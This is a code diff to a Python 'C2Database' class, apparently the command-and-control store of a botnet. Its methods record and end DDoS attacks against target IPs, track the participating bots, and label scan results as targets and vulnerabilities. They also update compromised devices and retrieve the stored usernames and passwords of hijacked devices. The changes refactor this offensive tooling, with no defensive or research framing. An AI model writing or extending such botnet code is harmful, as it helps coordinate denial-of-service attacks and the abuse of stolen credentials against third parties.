@@ -225,10 +225,10 @@ class C2Database:
             results = []
             for row in cursor.fetchall():
                 results.append({
-                    'ip': row[0],
-                    'port': row[1],
-                    'service': row[2],
-                    'status': row[3],
+                    'target_ip': row[0],
+                    'open_ports': f"{row[1]} ({row[2]})" if row[2] else str(row[1]),
+                    'scan_time': row[4],
+                    'vulnerability': row[3],
                     'timestamp': row[4]
                 })
             
@@ -239,38 +239,49 @@ class C2Database:
                          attack_type: str, bot_ips: List[str]) -> int:
         """Log start of DDoS attack"""
         with self.lock:
-            conn = sqlite3.connect(self.db_path)
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                INSERT INTO ddos_attacks 
-                (target_ip, target_port, attack_type, participating_bots, start_time, status)
-                VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, 'active')
-            ''', (target_ip, target_port, attack_type, json.dumps(bot_ips)))
-            
-            attack_id = cursor.lastrowid
-            conn.commit()
-            conn.close()
-            return attack_id
+            try:
+                conn = sqlite3.connect(self.db_path)
+                cursor = conn.cursor()
+                
+                now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                bots_json = json.dumps(bot_ips)
+                
+                cursor.execute('''
+                    INSERT INTO ddos_attacks (
+                        target_ip, target_port, attack_type, 
+                        participating_bots, start_time, status
+                    )
+                    VALUES (?, ?, ?, ?, ?, 'active')
+                ''', (target_ip, target_port, attack_type, bots_json, now))
+                
+                attack_id = cursor.lastrowid
+                conn.commit()
+                conn.close()
+                return attack_id
+            except Exception as e:
+                print(f"Error starting DDoS attack: {e}")
+                return -1
     
-    def stop_ddos_attack(self, attack_id: int) -> bool:
+    def end_ddos_attack(self, attack_id: int) -> bool:
         """Log end of DDoS attack"""
         with self.lock:
             try:
                 conn = sqlite3.connect(self.db_path)
                 cursor = conn.cursor()
                 
+                now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                
                 cursor.execute('''
-                    UPDATE ddos_attacks 
-                    SET end_time = CURRENT_TIMESTAMP, status = 'completed'
+                    UPDATE ddos_attacks
+                    SET status = 'completed', end_time = ?
                     WHERE id = ?
-                ''', (attack_id,))
+                ''', (now, attack_id))
                 
                 conn.commit()
                 conn.close()
-                return True
+                return cursor.rowcount > 0
             except Exception as e:
-                print(f"Error stopping DDoS attack: {e}")
+                print(f"Error ending DDoS attack: {e}")
                 return False
     
     def get_active_attacks(self) -> List[Dict]:
@@ -280,45 +291,80 @@ class C2Database:
             cursor = conn.cursor()
             
             cursor.execute('''
-                SELECT id, target_ip, target_port, attack_type, 
-                       participating_bots, start_time
+                SELECT id, target_ip, target_port, attack_type, participating_bots, start_time
                 FROM ddos_attacks
                 WHERE status = 'active'
             ''')
             
             attacks = []
             for row in cursor.fetchall():
+                try:
+                    bots = json.loads(row[4]) if row[4] else []
+                except:
+                    bots = []
+                
                 attacks.append({
                     'id': row[0],
                     'target_ip': row[1],
                     'target_port': row[2],
                     'attack_type': row[3],
-                    'participating_bots': json.loads(row[4]),
+                    'participating_bots': bots,
+                    'bot_count': len(bots),
                     'start_time': row[5]
                 })
             
             conn.close()
             return attacks
     
-    def update_bot_status(self, bot_ip: str, status: str) -> bool:
-        """Update bot last seen timestamp"""
+    def update_bot_status(self, ip: str, status: str) -> bool:
+        """Update status of a bot"""
         with self.lock:
             try:
                 conn = sqlite3.connect(self.db_path)
                 cursor = conn.cursor()
                 
+                now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                
                 cursor.execute('''
-                    UPDATE compromised_devices 
-                    SET last_seen = CURRENT_TIMESTAMP, status = ?
+                    UPDATE compromised_devices
+                    SET status = ?, last_seen = ?
                     WHERE ip_address = ?
-                ''', (status, bot_ip))
+                ''', (status, now, ip))
                 
                 conn.commit()
                 conn.close()
-                return True
+                return cursor.rowcount > 0
             except Exception as e:
                 print(f"Error updating bot status: {e}")
                 return False
+    
+    def get_device_by_ip(self, ip_address: str) -> Optional[Dict]:
+        """Get device information by IP address"""
+        with self.lock:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            cursor.execute('''
+                SELECT id, ip_address, port, username, password, device_type, status, last_seen
+                FROM compromised_devices
+                WHERE ip_address = ?
+            ''', (ip_address,))
+            
+            row = cursor.fetchone()
+            conn.close()
+            
+            if row:
+                return {
+                    'id': row[0],
+                    'ip': row[1],
+                    'port': row[2],
+                    'username': row[3],
+                    'password': row[4],
+                    'device_type': row[5],
+                    'status': row[6],
+                    'last_seen': row[7]
+                }
+            return None
     
     def get_statistics(self) -> Dict:
         """Get database statistics"""
